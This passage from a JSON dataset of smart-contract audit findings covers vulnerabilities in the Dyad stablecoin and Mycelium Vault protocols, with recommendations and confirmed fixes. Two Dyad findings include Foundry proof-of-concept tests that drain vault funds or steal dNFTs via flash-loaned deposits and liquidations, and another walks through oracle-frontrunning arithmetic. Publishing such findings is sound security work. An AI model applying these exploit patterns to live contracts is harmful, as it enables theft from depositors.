      "summary": "\nThe DYAD system is designed to enforce a collateralization ratio of 300%, meaning that for every 1 DYAD in circulation, there is 3x as much ETH (priced in USD) in the vault. The withdraw() function is designed to stop users from minting more DYAD when such a mint would break the invariant. However, the same check is not enforced when redeeming ETH out of the contract. This can lead to the collateralization ratio dropping to 1:1, which is why it is important to enforce the check on both DYAD minting and ETH redeeming.\n\nTo fix this issue, the collateralization logic was moved into a modifier and implemented in both the withdraw() and redeemDeposit() functions. Additionally, a check was added to ensure that the collateralization ratio is not checked when dyad.totalSupply() is 0.\n\nThe fix was confirmed in PR #20 and is now included in the DYAD system.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-02-12-Dyad.md",
      "github_link": "",
      "tags": [
        "Collateral Factor"
      ],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18765",
      "title": "[H-05] Current liquidation mechanism is ineffective and dangerous",
      "impact": "HIGH",
      "content": "The liquidation mechanism is intended to keep the protocol overcollateralized. However, the current mechanism design seems inherently unstable and doesn't accomplish the objective.\n\nCurrently, the logic for liquidation is as follows:\n\n- The shares held by a specific dNFT falls below a certain threshold (currently 0.1%)\n- A Liquidator sends sufficient ETH to push that dNFT's shares above the threshold\n- The Liquidator gets possession of the dNFT, as well as all the shares that it previously owned\n- There are a number of issues I see with this. I'll go into details below, and then share some thoughts on how this might look in the Recommendations section.\n\n**No Stable Equilibrium**\n\nThere is no game theoretically stable place for this system to land. The specifics will depend on the threshold that is chosen, but at most thresholds there will always be users who are near the line (at some, like the current 0.1%, it is a mathematical guarantee that at least half of the users will be liquidatable at all times).\n\nThis creates a competitive dynamic that users will always need to be fighting to be in the top 50%, liquidating other users, and depositing ETH in to stay near the top.\n\nWhile this is reminiscent of some of the most fun degen projects of 2022, the goal for core is to provide stability, and these dynamics are not conducive to such stability.\n\n**Not Fair to Users Who Get Liquidated**\n\nEven in the even that we want these competitive dynamics, there are a spectrum of possibilities between favoring the user who is liquidated or who is the liquidator.\n\nThis system heavily favors the liquidator, in a way that feels unfair to normal users.\n\nIf a user's number of shares falls even 1% shy of the threshold, a liquidator can add that 1% and take the original user's 99%, as well as their dNFT. A more reasonable system might require the liquidator to put up the full 100%, and refund the original user their 99%, losing them their dNFT only.\n\n**Doesn't Accomplish the Stated Goal**\n\nWe need to use liquidations as a tool to keep the system overcollateralized. This means, as much as possible, we should (a) understand the situations that might cause undercollateralization and allow liquidations to resolve this issue, and (b) not have liquidations impact behavior when they don't support this goal.\n\nLooking at a few examples, we can see that the current example is off:\n\n- A user with 1% of the dD but 20% of the withdrawn DYAD is contributing massively to missing the collateralization ratio, but would not be liquidatable\n- A user with 0.01% of the dD and no withdrawn DYAD is not negatively impacting the collateralization ratio, but would be liquidatable\n\n**Easily Abusable**\n\nSince users who might be performing the liquidations also have the ability to impact the totalDeposits (which is the denominator in calculating the liquidation threshold), it's easy for a user to put the contract in a state that allows liquidations that wouldn't otherwise be possible. This is similar to issue C-02.\n\n**Recommendations**\n\nIf our goals are to have liquidations keep the protocol overcollateralized, the simplest way to accomplish this is to force every dNFT to be similarly overcollateralized.\n\nThis also has the advantage of keeping liquidations based on a user's own decisions, rather than outside circumstances that can be manipulated by other users.\n\nFurthermore, enforcing collateralization on the user level avoids the unfair situation that is currently possible, where one user gets more \"benefit\" in the form of withdrawing DYAD than another, because the first user withdraws first, and the second is therefore unable to because of the system-wide collateralization ratio.\n\nThis is difficult to accomplish, especially in the current system where the ideal invariant of totalDeposit \\* ETH price == address(this).balance is not enforced. However, if changes are made to the rebasing process to ensure that this becomes a true invariant, it opens up the ability to track this properly.\n\nOne way to accomplish this would be:\n\n- We can create a \\_shares2Deposit() function that calculates the underlying DYAD value of a number of shares\n- We can add a mapping (uint => uint) dyadWithdrawn that tracks the DYAD that's been withdrawn for each dNFT\n- When redeeming (ETH) or withdrawing (DYAD), we can check the user invariant that, after the changes are made, \\_shares2Deposit(id2Shares[id]).divWadDown(dyadWithdrawn[id]) >= MIN_COLLATERIZATION_RATIO.\n- There could still be a situation where a user falls below the MIN_COLLATERIZATION_RATIO based on the price of ETH falling. In this case, they would be susceptible to a gentle liquidation to incentivize a third party to bring the dNFT back into the correct range (ie the user would have their ETH refunded and the liquidator would supply the replacement ETH, and would get the dNFT as a reward).\n\nReview\nFix confirmed in [PR #20](https://github.com/DyadStablecoin/contracts-v3/pull/20) and [PR #23](https://github.com/DyadStablecoin/contracts-v3/pull/23).",
      "summary": "\nThe DyadStablecoin protocol has a liquidation mechanism that is intended to keep the protocol overcollateralized. However, the current mechanism design is inherently unstable and does not accomplish the objective. The liquidation logic works as follows: when the shares held by a specific dNFT falls below a certain threshold, a Liquidator sends sufficient ETH to push that dNFT's shares above the threshold and gets possession of the dNFT, as well as all the shares that it previously owned.\n\nThe main issues with this system are that there is no game theoretically stable place for this system to land, it heavily favors the liquidator, and it does not accomplish its stated goal of keeping the system overcollateralized. Furthermore, it is easily abusable since users who might be performing the liquidations also have the ability to impact the totalDeposits.\n\nTo address these issues, it is recommended to force every dNFT to be similarly overcollateralized. This would keep liquidations based on a user's own decisions, rather than outside circumstances that can be manipulated by other users. To do this, a \\_shares2Deposit() function can be created to calculate the underlying DYAD value of a number of shares and a mapping (uint => uint) dyadWithdrawn can be added to track the DYAD that's been withdrawn for each dNFT. When redeeming (ETH) or withdrawing (DYAD), the user invariant that \\_shares2Deposit(id2Shares[id]).divWadDown(dyadWithdrawn[id]) >= MIN_COLLATERIZATION_RATIO can be checked. If a user falls below the MIN_COLLATERIZATION_RATIO based on the price of ETH falling, they would be susceptible to a gentle liquidation to incentivize a third party to bring the dNFT back into the correct range.\n\nFixes for these issues have been confirmed in Pull Requests #20 and #23.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-02-12-Dyad.md",
      "github_link": "",
      "tags": [
        "Liquidation"
      ],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18764",
      "title": "[H-04] If insider deposits and unlocks in quick succession, attacker can steal their NFT and their deposit funds",
      "impact": "HIGH",
      "content": "The dNFT contract allows the owner to mint a predefined quantity of \"insider\" NFTs without any deposit attached to them. These NFTs begin in a locked state, which stops them from being immediately liquidated due to their lack of deposits.\n\nThe protocol enforces that, in order for insider's to mint any DYAD, they must unlock their NFTs (so that they will be subject to liquidation, like all other users).\n\nHowever, there is no safety check for the opposite case, where an insider unlocks their NFT before making a deposit. In this situation, any user could liquidate them and steal their NFT.\n\nThis is especially dangerous because if a user calls both of these functions in quick succession, they may both be in the mempool at the same time. If this is the case, a malicious attacker can create a flashbots bundle to sandwich their liquidation transaction between the unlock() and deposit() transactions, with the result that:\n\n- The attacker will successfully liquidate and steal the insider's NFT\n- The deposit transaction will deposit the insider's ETH to the stolen NFT, securing it for the attacker\n\n**Recommendation**\n\nI would recommend adding a check to the unlock() function to ensure this situation is avoided:\n\n```solidity\nfunction unlock(uint id)\nexternal\nisNftOwner(id)\n{\nif (!id2Locked[id]) revert NotLocked();\nif (id2Shared[id] == 0) revert MustDepositFirst();\nid2Locked[id] = false;\nemit Unlocked(id);\n}\n```\n\nNote: This requires adding a MustDepositFirst() error to IDNft.sol.\n\n**Review**\n\nThe new liquidation mechanism (see fix for H-02) only liquidates if withdrawals exceed collateralization ratio, so this attack is no longer possible.",
      "summary": "\nThe bug report discusses a potential security flaw in the dNFT contract. The flaw is that an insider can unlock their NFTs without first making a deposit, which would allow any user to liquidate them and steal the NFT. This is especially dangerous because if a user calls both the unlock() and deposit() functions in quick succession, the malicious attacker can create a flashbots bundle to sandwich their liquidation transaction between the two, allowing them to successfully liquidate and steal the insider's NFT.\n\nThe recommendation is to add a check to the unlock() function to ensure this situation is avoided. This requires adding a MustDepositFirst() error to IDNft.sol.\n\nThe review notes that the new liquidation mechanism only liquidates if withdrawals exceed collateralization ratio, so this attack is no longer possible.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-02-12-Dyad.md",
      "github_link": "",
      "tags": [
        "Sandwich Attack",
        "NFT",
        "Missing Check"
      ],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18763",
      "title": "[H-03] Using oracle provided price for deposits and redemptions allows user to steal funds",
      "impact": "HIGH",
      "content": "New deposits use the \\_eth2dyad() function to calculate the exchange rate, which simplifies down to: AMOUNT_OF_ETH \\* ORACLE_PRICE_OF_ETH / 1e8;\n\nSimilarly, all redeeming uses \\_dyad2eth(), which calculates the exchange rate as: AMOUNT_OF_DYAD \\* 1e8 / ORACLE_PRICE_OF_ETH;\n\nThe problem is that a user can know which direction the oracle price of ETH will move before it does, either through watching the ETH price move in advance of the oracle updating, or watching the mempool for oracle update transactions and frontrunning them.\n\nNote that this issue is distinct from C-01 because it exists even if rebase() is automatically called within each function and stays perfectly up to date.\n\n**Proof of Concept**\n\nThere are two ways this knowledge can be used to attack the protocol.\n\n1. A user can perform arbitrage within the protocol, dodging price updates that aren’t in their favor, to take a larger proportion of shares than they should have:\n\n- The pool is 20 ETH, all was bought at $1k, and I’m 50% of the pool.\n- eth2Dyad(20 ETH) = 20k\n- totalShares = 20k\n- totalDeposit = 20k\n- myShares = 10k\n- I see that eth is moving to $995, so I frontrun and withdraw max (25%) into DYAD.\n- totalShares = 20k - 2.5k = 17.5k\n- totalDeposit = 20k - 2.5k = 17.5k\n- myShares = 7.5k\n- my DYAD: 2.5k\n- When the oracle updates ETH price down to $995:\n- supplyDelta = 20k \\* 0.005 = 100\n- totalDeposit = 17,400\n- I backrun the oracle update and immediately deposit all my DYAD back:\n- \\_depositToShares(2.5k) = 2514\n- myShares = 7.5k + 2514 = 10,014\n- totalShares = 17.5k + 2514 = 20,014\n\nThe result is that I now own 50.03% of the pool and the other people own 49.97%. While these numbers may seem small, this attack can be repeated at each price update until I slowly dilute everyone else.\n\nWhile this first attack can be stopped by implementing a 1 hour waiting period on all withdrawals, the second attack can be hedged out in order to ensure profitability, even with a forced waiting window.\n\n2. A user can take advantage of the fact that depositing ETH into the pool is equivalent to buying slightly leveraged ETH, and can time their buys to earn extra on their leverage, hedging out the risk until they can withdraw.\n\n- Let’s say the pool leverage is 1.25x. There’s 10 ETH in the pool (none of it mine). All ETH was bought at $1k, and then max DYAD was withdrawn:\n- totalShares = 10k - 2.5k withdrawal = 7.5k\n- totalDeposits = 10k - 2.5k withdrawal = 7.5k\n- I see that ETH is moving to $1005 and I want to get a levered version of that 0.5% move, so I frontrun the deposit with another 10 ETH:\n- totalShares = 17.5k\n- totalDeposits = 17.5k\n- myShares = 10k\n- When the rebase happens, totalDeposits goes up by 0.5% of DYAD + dD, which equals 100:\n- totalDeposits = 17,600\n- since i have 10k/17.5k shares, my share of the deposits is 10,057\n- at current ETH prices, this is 10.00696517 ETH, but i only put in 10 ETH\n- In order to ensure a risk-free trade, at the same time I do this, I short 10 ETH elsewhere:\n- I’m now protected from ETH price movement risk\n- 1 hour later, I withdraw and close the short position, earning ~0.007 ETH profit\n- Again, this seems small, but the numbers in the example were small. It seems reasonable that a malicious user could 1000x that, which would claim a 6.9 ETH profit each hour, at the expense of other protocol users.\n\n**Recommendation**\nUnfortunately this attack is foundational to the nature of pulling exchange rates directly from an oracle. To protect against this attack requires a foundational change in rearchitecture, for example, storing deposits and redemptions and executing them at a future exchange rate.\n\n**Review**\n\nThe DYAD team is working on a new oracleless mechanism for ensuring sufficient collateral. The code will be reaudited when this change is complete.",
      "summary": "\nA bug report has been filed regarding the \\_eth2dyad() and \\_dyad2eth() functions used for new deposits and redemptions in the DYAD protocol. The issue is that a user can take advantage of the exchange rate calculation to know which direction the oracle price of ETH will move before it does, either through watching the ETH price move in advance of the oracle updating, or watching the mempool for oracle update transactions and frontrunning them. This knowledge can be used to attack the protocol in two ways. The first is by performing arbitrage within the protocol, dodging price updates that aren’t in their favor, to take a larger proportion of shares than they should have. The second is by taking advantage of the fact that depositing ETH into the pool is equivalent to buying slightly leveraged ETH, and can time their buys to earn extra on their leverage, hedging out the risk until they can withdraw. To protect against this attack requires a foundational change in rearchitecture, for example, storing deposits and redemptions and executing them at a future exchange rate. The DYAD team is currently working on a new oracleless mechanism for ensuring sufficient collateral, which will be reaudited when the change is complete.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-02-12-Dyad.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18762",
      "title": "[H-02] Can steal all dNFTs and funds from contract by flash loaning deposits & liquidations",
      "impact": "HIGH",
      "content": "When liquidate() is called for a given dNFT ID, there are two requirements:\n\n- The current shares of that ID must be less than 0.1% of the total shares in the pool\n- The shares after the liquidator's funds are deposited must by greater than 0.1% of the total shares in the pool\n\nThis can be exploited to steal any dNFT by depositing sufficient ETH to move the pool to greater than 1000x a given depositor, liquidating them and adding a small balance to push them over 0.1% of the pool, and withdrawing the initial deposit.\n\nBy sorting all dNFTs from lowest balance to highest, an attacker could perform this attack in such a way as to liquidate every dNFT, assuming sufficient funds (which would be easy to secure via Flash Loans).\n\nBecause internal balances are held by the dNFT rather than the user, this would also have the effect of moving the entire value of the vault to the attacker.\n\n**Proof of Concept**\n\n```solidity\nfunction test_CanLiquidateAnyone() public {\naddress attacker = makeAddr(\"attacker\");\nvm.deal(attacker, 6000 ether);\naddress victim = makeAddr(\"victim\");\nvm.deal(victim, 1000 ether);\n\nvm.prank(attacker);\nuint id1 = dNft.mint{value: 5 ether}(attacker);\n\nvm.prank(victim);\nuint id2 = dNft.mint{value: 5 ether}(victim);\n\nvm.startPrank(attacker);\ndNft.deposit{value: 5000 ether}(id1);\ndNft.liquidate{value: 1 ether}(id2, attacker);\ndNft.redeemDeposit(id1, attacker, 5000 ether);\n\nassertEq(dNft.ownerOf(id2), attacker);\n}\n```\n\n**Recommendation**\nThe logic of the liquidation process needs to be rethought. Besides this possible attack, it seems that liquidating users when their shares fall below 0.1% of the total is likely to lead to unexpected dynamics and doesn't accomplish the goal of keeping the protocol solvent.\n\n**Review**\n\nThe new liquidation mechanism (see fix for H-02) only liquidates if withdrawals exceed collateralization ratio, so this attack is no longer possible.",
      "summary": "\nThis bug report describes an exploit in the liquidation process of a dNFT. When liquidate() is called, it requires that the current shares of the dNFT ID must be less than 0.1% of the total shares in the pool and the shares after liquidator’s funds are deposited must be greater than 0.1% of the total shares in the pool. This can be exploited to steal any dNFT by depositing sufficient ETH to move the pool to greater than 1000x a given depositor, liquidating them and adding a small balance to push them over 0.1% of the pool, and withdrawing the initial deposit. The exploit is demonstrated with a proof of concept code.\n\nThe recommendation is to rethink the logic of the liquidation process. This attack can be prevented by only liquidating if withdrawals exceed the collateralization ratio. This has been implemented in the fix for H-02.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-02-12-Dyad.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18761",
      "title": "[H-01] User can steal vault funds by sequencing deposit, rebase, and redeem",
      "impact": "HIGH",
      "content": "When a user deposits into the protocol, their msg.value is converted into a number of shares in two steps:\n\n- \\_eth2dyad() calculates the USD value of the ETH, based on the current oracle.\n- \\_deposit2Shares() calculates the number of shares they should receive for that USD value.\n\nThe issue lies in the fact that the USD-ETH conversion used for Step 1 is out of sync with Step 2. Specifically, Step 1 relies on the current Chainlink Oracle, while Step 2 relies on the saved totalDeposit value to account for moving prices, which requires rebase() being called.\n\nThe result is that, if a user deposits before rebase() is called, they capture the benefits of the higher exchange rate for their ETH. And when rebase() is called, they capture an additional appreciation of their shares.\n\nThis is a significant problem for two reasons.\n\n**Problem 1:** The adjustment doesn't just give them more upside relative to other users. It actually breaks the vault accounting and can leave the protocol insolvent. This is because the withdrawal process is based on the current price of ETH, and the user in the above situation is entitled to more ETH than is actually in the vault.\n\nFor a simple example, you can walk through the math imagining they are the first depositor:\n\n- The initial price of ETH in the vault is 1000 USD/ETH\n- The price increases to 1100 USD/ETH, but rebase hasn't been called yet\n- Alice deposits 5 ETH, and receives 5500 shares as a result\n- At this point, totalDeposits also equals 5500\n- Rebase is called, and totalDeposits is increased by 10%, moving to 6050\n- Alice tries to withdraw her 5500 shares = 6050 DYAD = 5.5 ETH\n- The vault is insolvent, because there is only 5 ETH in it\n\n**Problem 2:** More importantly, the appreciation from rebase() is a percentage, not a fixed value. The result is that, if the deposit() is very large (say, through a flash loan), a user is able to use the insolvency to withdraw the full holdings of the vault. See the Proof of Concept below for an example.\n\n**Proof of Concept**\n\n```solidity\nfunction test_CanLiquidateProtocolOnEthMove() public {\nuint id1 = dNft.mint{value: 100 ether}(address(this));\n\naddress attacker = makeAddr(\"attacker\");\nvm.deal(attacker, 5 ether);\nconsole.log(\"dNFT Vault Starting Balance: \", address(dNft).balance);\nconsole.log(\"Attacker Starting Balance: \", attacker.balance);\nvm.prank(attacker);\nuint id2 = dNft.mint{value: 5 ether}(attacker);\n\noracleMock.setPrice(1100e8); // 10% increase\n\n// Borrow a flash loan and being the attack...\nvm.deal(attacker, 1_000_000 ether);\nvm.startPrank(attacker);\ndNft.deposit{value: 1_000_000 ether}(id2);\n\n// Rebase to adjust totalDeposit up, even though we already bought at the higher value.\ndNft.rebase();\n\n// Now redeem the full value of the vault (not all of our assets, because it would revert).\ndNft.redeemDeposit(id2, attacker, address(dNft).balance * 1100);\n\n// Return the flash loan...\npayable(address(0)).transfer(1_000_000 ether);\n\nconsole.log(\"dNFT Vault Ending Balance: \", address(dNft).balance);\nconsole.log(\"Attacker Ending Balance: \", attacker.balance);\n}\n```\n\n```\nLogs:\ndNFT Vault Starting Balance:  100000000000000000000\nAttacker Starting Balance:  5000000000000000000\ndNFT Vault Ending Balance:  0\nAttacker Ending Balance:  105000000000000000000\n```\n\n**Recommendation**\nAt the very least, all deposit, withdraw & redeem functions should use the ETH price saved in storage, and rebase() should be called at the beginning of each of those functions. This will ensure the two values are kept aligned for all transfers of value.\n\n(Note: This also requires editing rebase() to ensure it simply exits early if an equal ETH price is returned, rather than reverting.)\n\nHowever, that still leaves open the possibility that users can take advantage of price moves that haven't yet been reflected on the Chainlink Oracle to get a favorable price. I've seen a few different models for resolving this but all are complex: the best is probably to save \"orders\" and then process them at the next price from Chainlink, regardless of what it is.\n\n**Review**\nTimeout mechanism implemented in [PR #28](https://github.com/DyadStablecoin/contracts-v3/pull/28) and [PR #29](https://github.com/DyadStablecoin/contracts-v3/pull/29) with rebase modifier in [PR #24](https://github.com/DyadStablecoin/contracts-v3/pull/24) solves the immediate risk of this being exploitable to steal all the protocol funds.\n\nSince the rebase modifier is used on all functions that access ETH price, the recommendation to pull ETH price from state is implemented in [PR #31](https://github.com/DyadStablecoin/contracts-v3/pull/31).\n\nThe larger concern around favorable prices is addressed in C-03.",
      "summary": "\nA bug has been reported in the DyadStablecoin protocol, which allows users to deposit ETH and receive a number of shares in return. The issue is that the USD-ETH conversion used for the deposit is out of sync with the number of shares they should receive for that USD value. This means that if a user deposits before rebase() is called, they capture the benefits of the higher exchange rate for their ETH. When rebase() is called, they capture an additional appreciation of their shares.\n\nThis is a problem for two reasons. Firstly, the adjustment doesn't just give them more upside relative to other users, it actually breaks the vault accounting and can leave the protocol insolvent. Secondly, the appreciation from rebase() is a percentage, not a fixed value. This means that if the deposit() is very large, a user is able to use the insolvency to withdraw the full holdings of the vault.\n\nTo solve this issue, Timeout mechanism, rebase modifier and a recommendation to pull ETH price from state have all been implemented in various Pull Requests. Additionally, the larger concern around favorable prices is addressed in C-03.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-02-12-Dyad.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "3404",
      "title": "M-4: Frontrun `deposit()` can cause the depositor to lose all the funds",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-mycelium-judging/tree/main/029-M \n\n## Found by \nctf\\_sec, Lambda, CRYP70, 8olidity, bin2chen, hansfriese, innertia, dipp, rbserver, CodingNameKiki, WATCHPUG\n\n## Summary\n\nThe attacker can frontrun the first depositor's `deposit()` transaction and transfer LINK tokens to the Vault contract directly and cause the depositor (and all the future depositors) to lose all the funds.\n\n## Vulnerability Detail\n\nIn `onTokenTransfer()`, if there are some existing balance in the Vault contract, say 1 wei of LINK token, `supplyBeforeTransfer` will be `1`, since `totalShares == 0`, `newShares` will always be `0`.\n\nThe same applies for `deposit()`.\n\n## Impact\n\nThe depositor who got frontrun by the attacker will lose all their funds. And all the future depositors.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-mycelium/blob/main/mylink-contracts/src/Vault.sol#L252-L276\n\nhttps://github.com/sherlock-audit/2022-10-mycelium/blob/main/mylink-contracts/src/Vault.sol#L131-L142\n\nhttps://github.com/sherlock-audit/2022-10-mycelium/blob/main/mylink-contracts/src/Vault.sol#L614-L620\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nIt should check if `totalShares == 0` to decide whether this is the first mint.",
      "summary": "\nThis bug report is about an issue related to the Mycelium Vault contract, which can cause the depositor to lose all the funds if the attacker frontruns the first depositor's `deposit()` transaction. It was found by ctf\\_sec, Lambda, CRYP70, 8olidity, bin2chen, hansfriese, innertia, dipp, rbserver, CodingNameKiki, and WATCHPUG.\n\nThe vulnerability lies in the `onTokenTransfer()` and `deposit()` functions in the Vault contract. If there is an existing balance in the Vault contract, say 1 wei of LINK token, `supplyBeforeTransfer` will be `1`, since `totalShares == 0`, `newShares` will always be `0`. This means that the attacker can frontrun the first depositor's `deposit()` transaction and transfer LINK tokens to the Vault contract directly and cause the depositor (and all the future depositors) to lose all the funds.\n\nThe impact of this vulnerability is that the depositor who got frontrun by the attacker will lose all their funds, as well as all the future depositors. To fix this issue, the code should check if `totalShares == 0` to determine if this is the first mint.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Mycelium",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-mycelium-judging/tree/main/029-M",
      "tags": [
        "Initial Deposit",
        "Front-Running",
        "First Depositor Issue"
      ],
      "finders": [
        "8olidity",
        "rbserver",
        "innertia",
        "bin2chen",
        "CodingNameKiki",
        "WATCHPUG",
        "Lambda",
        "hansfriese",
        "dipp",
        "CRYP70",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3403",
      "title": "M-3: `_withdrawFromPlugin()` will revert when `_withdrawalValues[i] == 0`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-mycelium-judging/tree/main/013-M \n\n## Found by \nctf\\_sec, hansfriese, WATCHPUG\n\n## Summary\n\n## Vulnerability Detail\n\nWhen `_withdrawalValues[i] == 0` in `rebalancePlugins()`, it means NOT to rebalance this plugin.\n\nHowever, the current implementation still tries to withdraw 0 from the plugin.\n\nThis will revert in AaveV2Plugin as Aave V2's `validateWithdraw()` does not allow `0` withdrawals:\n\nhttps://github.com/aave/protocol-v2/blob/554a2ed7ca4b3565e2ceaea0c454e5a70b3a2b41/contracts/protocol/libraries/logic/ValidationLogic.sol#L60-L70\n\n```solidity\n  function validateWithdraw(\n    address reserveAddress,\n    uint256 amount,\n    uint256 userBalance,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    DataTypes.UserConfigurationMap storage userConfig,\n    mapping(uint256 => address) storage reserves,\n    uint256 reservesCount,\n    address oracle\n  ) external view {\n    require(amount != 0, Errors.VL_INVALID_AMOUNT);\n```\n\n`removePlugin()` will also always `_withdrawFromPlugin()` even if the plugin's balance is 0, as it will also tries to withdraw 0 in that case (balance is 0).\n\n## Impact\n\nFor AaveV2Plugin (and any future plugins that dont allow withdraw 0):\n\n1. In every rebalance call, it must at least withdraw 1 wei from the plugin for the rebalance to work.\n2. The plugin can not be removed or rebalanced when there is no balance in it. \n\nIf such a plugin can not deposit for some reason (paused by gov, AaveV2Plugin may face that), this will further cause the whole system unable to be rebalanced until the deposit resumes for that plugin.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-mycelium/blob/main/mylink-contracts/src/Vault.sol#L367-L373\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nOnly call `_withdrawFromPlugin()` when `IPlugin(pluginAddr).balance() > 0`:\n\n```solidity\nfunction removePlugin(uint256 _index) external onlyOwner {\n    require(_index < pluginCount, \"Index out of bounds\");\n    address pluginAddr = plugins[_index];\n    if (IPlugin(pluginAddr).balance() > 0){\n        _withdrawFromPlugin(pluginAddr, IPlugin(pluginAddr).balance());\n    }\n    uint256 pointer = _index;\n    while (pointer < pluginCount - 1) {\n        plugins[pointer] = plugins[pointer + 1];\n        pointer++;\n    }\n    delete plugins[pluginCount - 1];\n    pluginCount--;\n\n    IERC20(LINK).approve(pluginAddr, 0);\n\n    emit PluginRemoved(pluginAddr);\n}\n```\n\n```solidity\nfunction rebalancePlugins(uint256[] memory _withdrawalValues) external onlyOwner {\n    require(_withdrawalValues.length == pluginCount, \"Invalid withdrawal values\");\n    for (uint256 i = 0; i < pluginCount; i++) {\n        if (_withdrawalValues[i] > 0)\n            _withdrawFromPlugin(plugins[i], _withdrawalValues[i]);\n    }\n    _distributeToPlugins();\n}\n```",
      "summary": "\nThis bug report is about the `_withdrawFromPlugin()` function in the Mycelium Vault contract. The function is used to rebalance the plugins, but when `_withdrawalValues[i] == 0` in `rebalancePlugins()`, it means NOT to rebalance this plugin. However, the current implementation still tries to withdraw 0 from the plugin, which will cause a revert in AaveV2Plugin as Aave V2's `validateWithdraw()` does not allow `0` withdrawals. Additionally, `removePlugin()` will also always `_withdrawFromPlugin()` even if the plugin's balance is 0, as it will also tries to withdraw 0 in that case (balance is 0).\n\nThe impact of this bug is that, for AaveV2Plugin (and any future plugins that dont allow withdraw 0):\n1. In every rebalance call, it must at least withdraw 1 wei from the plugin for the rebalance to work.\n2. The plugin can not be removed or rebalanced when there is no balance in it. \nIf such a plugin can not deposit for some reason (paused by gov, AaveV2Plugin may face that), this will further cause the whole system unable to be rebalanced until the deposit resumes for that plugin.\n\nThe recommendation is to only call `_withdrawFromPlugin()` when `IPlugin(pluginAddr).balance() > 0`. This can be done by modifying the `removePlugin()` and `rebalancePlugins()` functions.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Mycelium",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-mycelium-judging/tree/main/013-M",
      "tags": [
        "Withdraw 0",
        "Aave"
      ],
      "finders": [
        "WATCHPUG",
        "hansfriese",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3402",
      "title": "M-2: Lack of sanity checks for new plugin address in `addPlugin()`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-mycelium-judging/tree/main/010-M \n\n## Found by \nRuhum, ctf\\_sec, bin2chen, hansfriese, 0x52, dipp, berndartmueller, WATCHPUG\n\n## Summary\n\nWithout sanity checks for new plugin address in `addPlugin()`, wrong address or duplicated address can be added.\n\n## Vulnerability Detail\n\nWhen adding a new plugin, there are no sanity checks for the new plugin's address.\n\nHowever, adding a wrong address or duplicated address can cause severe damage to the users, and it may be irreversible:\n\nWhen the new plugin is not a correct contract, `removePlugin()` will revert at `IPlugin(_plugin).withdraw(_amount);`.\n\n## Impact\n\nWhen a wrong address is added as a plugin, many essential features of the Vault contract will malfunction, including `deposit()` and `withdraw()`, as `totalSupply()` will revert at `IPlugin(plugins[i]).balance()`.\n\nWhen an existing plugin is wrongfully added as a new plugin, the `totalSupply()` will double count the balance of that plugin, which makes the user who deposits receives fewer shares and the users who withdraw, receives more tokens.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-mycelium/blob/main/mylink-contracts/src/Vault.sol#L314-L329\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n1. Add a check to ensure `_plugin.Vault == address(this)`, which will first ensure the plugin address is a valid contract with Vault interface, and it's set to the correct vault address.\n2. Add a check to ensure `_plugin` is new (not an existing one).",
      "summary": "\nThis bug report is about an issue found in the Mycelium Vault contract, which is a part of the Mycelium project. The issue is that there are no sanity checks for the new plugin's address when adding a new plugin. This can lead to wrong address or duplicated address being added, causing severe damage to users and irreversible damage. When a wrong address is added, many essential features of the Vault contract will malfunction, including `deposit()` and `withdraw()`. When an existing plugin is wrongfully added as a new plugin, the `totalSupply()` will double count the balance of that plugin, which makes the user who deposits receives fewer shares and the users who withdraw, receives more tokens. This issue was found by Ruhum, ctf_sec, bin2chen, hansfriese, 0x52, dipp, berndartmueller, and WATCHPUG through manual review. The recommended solutions for this issue are to add a check to ensure `_plugin.Vault == address(this)` to ensure the plugin address is a valid contract with the Vault interface, and to add a check to ensure `_plugin` is new (not an existing one).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Mycelium",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-mycelium-judging/tree/main/010-M",
      "tags": [],
